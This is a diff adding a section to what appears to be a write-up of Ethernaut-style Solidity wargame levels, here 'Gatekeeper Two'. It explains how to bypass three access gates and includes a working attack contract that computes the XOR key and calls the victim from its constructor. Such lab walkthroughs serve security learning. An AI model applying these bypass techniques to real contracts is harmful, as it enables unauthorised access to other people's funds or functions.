@@ -260,4 +260,32 @@ contract AttackGatekeeperOne {
 }
 ```
 
+## 13. Gatekeeper Two
+Very similar to the previous level except it requires you to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.
 
+1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
+2. `gateTwo` stumped me for a little while because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor! When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed! 
+3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.
+
+```
+pragma solidity ^0.6.0;
+
+contract AttackGatekeeperTwo {
+    
+    constructor(address _victim) public {
+        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
+        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
+        (bool success,) = _victim.call(payload);
+        require(success, "failed somewhere...");
+    }
+    
+    
+    function passGateThree() public view returns(bool) {
+        // if a ^ b = c then a ^ c = b;
+        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = uint64(0) - 1
+        // therefore uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 = uint64(_gateKey) 
+        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
+        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == uint64(0) - 1;
+    }
+}
+```
